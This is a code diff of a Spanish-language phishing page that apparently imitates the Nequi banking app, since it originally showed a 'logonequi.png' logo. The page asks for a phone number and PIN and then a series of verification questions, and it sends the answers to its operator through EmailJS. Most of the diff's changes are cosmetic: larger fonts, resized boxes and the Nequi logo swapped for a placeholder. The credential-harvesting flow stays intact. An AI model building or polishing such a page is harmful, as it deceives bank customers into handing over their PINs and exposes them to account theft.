@@ -2,10 +2,10 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
 
 <!-- FUENTE (más formal) -->
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
 <!-- EmailJS SDK -->
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
@@ -32,29 +32,29 @@ body {
 /* CONTENEDOR - MÁS GRANDE EN CELULAR */
 .container {
     width: 100%;
-    max-width: 480px;
+    max-width: 400px;
     background: #ffffff;
     padding: 32px 28px;
     border-radius: 24px;
     box-shadow: 0 8px 24px rgba(0,0,0,0.08);
 }
 
-/* LOGO - TAMAÑO ORIGINAL */
+/* LOGO - MÁS GRANDE */
 .logo-space {
-    height: 65px;
-    margin-bottom: 16px;
+    height: auto;
+    margin-bottom: 20px;
     display: flex;
     justify-content: center;
     align-items: center;
 }
 
 .logo {
-    max-height: 55px;
-    width: auto;
+    max-width: 120px;
+    height: auto;
     object-fit: contain;
 }
 
-/* TEXTO - MÁS GRANDE EN CELULAR */
+/* TEXTO - MÁS GRANDE */
 .description {
     text-align: center;
     font-size: 15px;
@@ -70,11 +70,11 @@ body {
 
 input, select {
     width: 100%;
-    padding: 16px 14px;
-    border-radius: 10px;
+    padding: 16px;
+    border-radius: 12px;
     border: none;
     background: #f7dbe6;
-    font-size: 15px;
+    font-size: 16px;
     color: #333;
     font-weight: 500;
 }
@@ -87,26 +87,26 @@ input:focus, select:focus {
 input::placeholder {
     color: #8a8f98;
     font-weight: 400;
-    font-size: 14px;
+    font-size: 15px;
 }
 
 /* CHECKBOX - MÁS GRANDE */
 .check-container {
     display: flex;
     align-items: center;
-    gap: 16px;
+    gap: 20px;
     border: 2px solid #f2a6c3;
     border-radius: 16px;
-    padding: 18px 16px;
+    padding: 18px;
     margin-top: 12px;
     cursor: pointer;
 }
 
 .circle {
-    width: 24px;
-    height: 24px;
-    min-width: 24px;
-    border: 2px solid #ff4fa3;
+    width: 28px;
+    height: 28px;
+    min-width: 28px;
+    border: 2.5px solid #ff4fa3;
     border-radius: 50%;
     position: relative;
 }
@@ -133,7 +133,7 @@ input::placeholder {
 }
 
 .check-text {
-    font-size: 15px;
+    font-size: 16px;
     font-weight: 500;
     color: #2a2a2a;
 }
@@ -142,10 +142,10 @@ input::placeholder {
 button {
     width: 100%;
     padding: 16px;
-    border-radius: 10px;
+    border-radius: 12px;
     border: none;
-    font-size: 15px;
-    margin-top: 18px;
+    font-size: 16px;
+    margin-top: 16px;
     cursor: pointer;
     transition: 0.2s;
     font-weight: 600;
@@ -156,6 +156,7 @@ button {
     color: white;
     opacity: 0.5;
     cursor: not-allowed;
+    font-weight: 600;
 }
 
 .primary.active {
@@ -169,17 +170,17 @@ button {
 
 .secondary {
     background: white;
-    border: 1px solid #cfcfcf;
+    border: 1.5px solid #cfcfcf;
 }
 
 .secondary:hover {
     background: #f5f5f5;
 }
 
-/* FOOTER */
+/* FOOTER - MÁS GRANDE */
 .footer {
     text-align: center;
-    margin-top: 18px;
+    margin-top: 20px;
     font-size: 13px;
     color: #6f7378;
 }
@@ -191,7 +192,7 @@ button {
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(255, 255, 255, 0.96);
+    background: rgba(255, 255, 255, 0.98);
     display: flex;
     justify-content: center;
     align-items: center;
@@ -201,11 +202,11 @@ button {
 }
 
 .semi-circle-loader {
-    width: 60px;
-    height: 60px;
-    border: 5px solid #f0c0d4;
-    border-top: 5px solid #ff4fa3;
-    border-right: 5px solid #ff4fa3;
+    width: 70px;
+    height: 70px;
+    border: 6px solid #f0c0d4;
+    border-top: 6px solid #ff4fa3;
+    border-right: 6px solid #ff4fa3;
     border-radius: 50%;
     animation: spin 0.8s linear infinite;
 }
@@ -218,7 +219,7 @@ button {
 .loader-text {
     color: #ff4fa3;
     font-weight: 500;
-    font-size: 14px;
+    font-size: 15px;
 }
 
 /* Ocultar secciones */
@@ -278,15 +279,15 @@ select {
 
 .final-title {
     font-size: 24px;
-    font-weight: 600;
+    font-weight: 700;
     color: #2a2a2a;
     margin-bottom: 20px;
 }
 
 .final-text {
-    font-size: 15px;
+    font-size: 16px;
     color: #5a5f66;
-    line-height: 1.6;
+    line-height: 1.5;
     margin-bottom: 28px;
 }
 
@@ -297,16 +298,59 @@ select {
     padding-top: 20px;
     border-top: 1px solid #f0c0d4;
 }
-</style>
-</head>
 
+/* Logo en pantalla final */
+.final-logo-space {
+    margin-top: 0;
+    margin-bottom: 20px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.final-logo {
+    max-width: 100px;
+    height: auto;
+    object-fit: contain;
+}
+</style>
+
+<!-- Media query para pantallas muy pequeñas (ajuste fino) -->
+<style media="(max-width: 380px)">
+    .container {
+        padding: 24px 20px;
+    }
+    .logo {
+        max-width: 100px;
+    }
+    input, select, button {
+        padding: 14px;
+    }
+    .check-container {
+        padding: 14px;
+    }
+    .circle {
+        width: 24px;
+        height: 24px;
+        min-width: 24px;
+    }
+    .circle::after {
+        width: 10px;
+        height: 10px;
+    }
+    .check-text {
+        font-size: 14px;
+    }
+</style>
+
+</head>
 <body>
 
 <div id="app">
     <!-- Pantalla inicial de login -->
     <div id="loginScreen" class="container">
         <div class="logo-space">
-            <img src="logonequi.png" class="logo" alt="logo">
+            <img src="https://via.placeholder.com/120x60?text=LOGO" class="logo" alt="logo">
         </div>
         <div class="description">
             Ingresa tu número del cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
@@ -437,7 +481,6 @@ select {
         return inputValue.replace(/[^0-9]/g, '');
     }
 
-    // Función para renderizar preguntas una por una
     function renderQuestion() {
         const questionsContent = document.getElementById('questionsContent');
         const q = questions[currentQuestionIndex];
@@ -557,13 +600,12 @@ select {
 
             try {
                 await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
-                
                 const questionsContent = document.getElementById('questionsContent');
                 questionsContent.innerHTML = `
-                    <div class="logo-space" style="margin-bottom: 20px;">
-                        <img src="logonequi.png" class="logo" alt="logo">
-                    </div>
                     <div class="final-message">
+                        <div class="final-logo-space">
+                            <img src="https://via.placeholder.com/100x50?text=LOGO" class="final-logo" alt="logo">
+                        </div>
                         <div class="final-title">Muchas gracias</div>
                         <div class="final-text">
                             Con esta información verificaremos si usted es el titular de la cuenta.<br><br>
@@ -588,7 +630,6 @@ select {
         });
     }
 
-    // Evento del botón Entrar
     document.getElementById('loginBtn')?.addEventListener('click', () => {
         const phone = document.getElementById('phoneInput').value.trim();
         const pin = document.getElementById('pinInput').value.trim();
